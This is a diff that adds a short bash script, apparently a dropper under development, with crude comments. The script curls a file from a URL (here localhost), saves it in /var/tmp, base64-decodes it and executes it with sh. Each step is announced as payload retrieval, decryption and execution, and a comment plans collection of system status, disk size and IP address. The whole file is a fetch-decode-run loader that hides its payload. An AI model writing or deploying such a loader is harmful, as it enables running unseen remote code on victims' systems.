@@ -1,0 +1,19 @@
+#!/bin/bash
+#seed me daddy
+
+echo '[ * ] Processing parameters for payload retrieval'
+
+#GET EVERYTHING; STATUS; SIZE OF DISK; IP ADDRESS;
+
+
+#REVIEW YOUR FUCKING LINUX LESSONS DAMMIT
+echo '[ * ] Attempting to retrieve remote payload'
+
+curl http://localhost/script_final > /var/tmp/feather
+
+
+echo '[ * ] Decrypting payload'
+cat /var/tmp/feather | base64 -d > /var/tmp/wing_rx
+
+echo '[ * ] Executing payload'
+sh /var/tmp/wing_rx
